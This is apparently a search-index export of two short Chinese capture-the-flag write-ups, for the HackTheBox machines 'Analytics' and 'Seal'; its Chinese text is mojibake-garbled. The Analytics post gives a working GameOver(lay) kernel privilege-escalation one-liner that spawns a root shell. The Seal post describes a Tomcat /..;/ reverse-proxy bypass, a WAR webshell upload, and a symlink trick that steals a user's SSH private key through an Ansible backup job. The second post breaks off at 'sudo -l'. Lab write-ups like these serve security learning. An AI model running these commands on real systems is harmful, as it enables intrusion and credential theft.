[{"content":"å¯»æ‰¾ç«‹è¶³ç‚¹ æ‰«æç«¯å£æ­£å¸¸1ï¼Œæœ‰åŸŸåæ‰«å­åŸŸåæ­£å¸¸ï¼Œç›®å½•çˆ†ç ´ä¹Ÿæ²¡ä¸œè¥¿\nåœ¨ç™»å½•é¡µé¢çœ‹åˆ°æ˜¯matebases\nmsfå­˜åœ¨å¯ä»¥åˆ©ç”¨æ¼æ´\næ”¹å‚æ•°æ‰§è¡Œæ‹¿åˆ°shell\næƒé™æå‡ linpeas.shæ‰«ä¸åˆ°ä¸œè¥¿\nuname -ræŸ¥çœ‹å†…æ ¸\nå‘ç°é€‚åˆ\nCVE-2023-2640-CVE-2023-32629\næ‰§è¡Œ\n1 2 unshare -rm sh -c \u0026#34;mkdir l u w m \u0026amp;\u0026amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026amp;\u0026amp; touch m/*;\u0026#34; \u0026amp;\u0026amp; u/python3 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ","date":"2025-03-19T14:33:16+08:00","permalink":"https://example.com/htb/analytics/","title":"Analytics"},{"content":"å¤–ç½‘æ‰“ç‚¹\nä¸‰æ¿æ–§\nå¼€äº†ä¸‰ä¸ªç«¯å£ 22ï¼Œ443ï¼Œ8080\næœ‰åŸŸåæ‰«å­åŸŸåæ— æœ\næ‰«ç›®å½•\nç°åœ¨è¦ä¹ˆå°±æ˜¯çœ‹ä¸äº†è¦ä¹ˆå°±æ˜¯è¦ç™»å½•ï¼Œçœ‹8080ç«¯å£\nåœ¨ä¸€ä¸ªå†å²ç‰ˆæœ¬é‡Œæ‰¾åˆ°äº†ç”¨æˆ·å¯†ç \nç™»å½•äº†ä¹‹å‰æ‰«401çš„ç›®å½•\nçœ‹/manger/status/allçœ‹ä¸åˆ°ç®¡ç†ç•Œé¢\nçœ‹ä¸€ä¸‹htmlçš„ä½†æ˜¯è·³åˆ°nginxäº†ã€‚ã€‚ã€‚ï¼ˆè¿™ä¸æ˜¯tomcatå—ï¼Ÿï¼‰\nä¹‹åæœäº†ä¸‹è¿™æ˜¯ç”¨nginxåå‘ä»£ç†äº†tomcat\nä¹‹åçœ‹äº†å…¶ä»–å¤§ä½¬çš„wp\nè¿™é‡Œå­˜åœ¨ä¸€ä¸ªç›®å½•ç©¿è¶Š\nå¤§ä½“å°±æ˜¯tomcatä¼šå°†/..;/è§£ææˆä¼ ç»Ÿæ„ä¹‰ä¸Šçš„/../ï¼Œè€Œnginxä¸ä¼šã€‚æ‰€ä»¥nginxæ”¾è¿‡äº†æœ¬è¯¥æ‹¦æˆªçš„URLè®¿é—®ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½è¿›å…¥æ§åˆ¶å°äº†ã€‚\n1 2 3 Web servers and reverse proxies normalize the request path. For example, the path /image/../image/ is normalized to /images/ . When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency. Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is. This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping. /manger/status/..;/htmlè¿›å…¥åˆ°ç®¡ç†åå°\nçœ‹åˆ°å¯ä»¥ä¸Šä¼ waræ–‡ä»¶ä¸Šä¼ ä¸€ä¸ªğŸæ‹¿åˆ°shell\næƒé™æå‡ æ‰¾äº†åŠå¤©æ‰¾åˆ°ä¸€ä¸ªrun.yml\n1 2 3 4 5 6 7 8 9 10 11 12 - hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: \u0026#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\u0026#34; - name: Clean file: state: absent path: /opt/backups/files/ ä»£ç è§£é‡Š\nsynchronizeæ¨¡å—ï¼šå…¶åŠŸèƒ½æ˜¯æŠŠæºç›®å½•/var/lib/tomcat9/webapps/ROOT/admin/dashboardå¤åˆ¶åˆ°ç›®æ ‡ç›®å½•/opt/backups/filesï¼Œå¹¶ä¸”å¤åˆ¶ç¬¦å·é“¾æ¥ã€‚\narchiveæ¨¡å—ï¼šå°†/opt/backups/files/ç›®å½•æ‰“åŒ…æˆä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œæ–‡ä»¶ååŒ…å«å½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼Œå­˜äº/opt/backups/archives/ç›®å½•ä¸‹ã€‚\nfileæ¨¡å—ï¼šæŠŠ/opt/backups/files/ç›®å½•åˆ é™¤ã€‚\nå¼€å¯äº†copy_linksï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€äº›å¥½ä¸œè¥¿è¿æ¥åˆ°/var/lib/tomcat9/webapps/ROOT/admin/dashboardç›®å½•ä¸‹ï¼Œç„¶åè®©è¿™ä¸ªè¿›ç¨‹æ‰“åŒ…ï¼Œä¹‹åæˆ‘ä»¬å†è§£å‹æ‹¿åˆ°ä¸œè¥¿\næ­£å¥½æˆ‘ä»¬æœ‰åœ¨/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploadsä¸‹å†™çš„æƒé™\n1 ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa ç„¶åç­‰å¾…æˆ‘ä»¬çš„id_rsa\nsshç™»å½•æ‹¿åˆ°user.txt\nsudo -læŸ¥çœ‹è¶…çº§æƒé™\n","date":"2025-03-19T14:05:44+08:00","permalink":"https://example.com/htb/seal/","title":"Seal"}]